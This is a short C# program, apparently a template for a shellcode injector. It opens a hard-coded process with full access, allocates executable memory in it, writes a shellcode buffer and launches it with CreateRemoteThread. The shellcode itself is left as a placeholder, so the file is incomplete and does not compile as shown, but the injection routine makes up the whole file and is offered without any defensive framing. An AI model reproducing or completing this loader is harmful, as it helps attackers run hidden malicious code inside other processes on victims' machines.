using System;
using System.Runtime.InteropServices;

public class Program
{
    // importing kernel32.dll to declare external windows API functions
    
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Main(string[] args)
    {
        IntPtr hProcess = OpenProcess(0x001F0FFF,false,1092);

        IntPtr addr = VirtualAllocEx(hProcess,IntPtr.Zero,0x1000,0x3000,0x40);
        
        // shell code

byte[] buf = new byte[size_of_shell_code] { shell code };

    IntPtr outSize;

    WriteProcessMemory(hProcess,addr,buf,buf.Length, out outSize);

    IntPtr hThread = CreateRemoteThread (hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    
    }
}
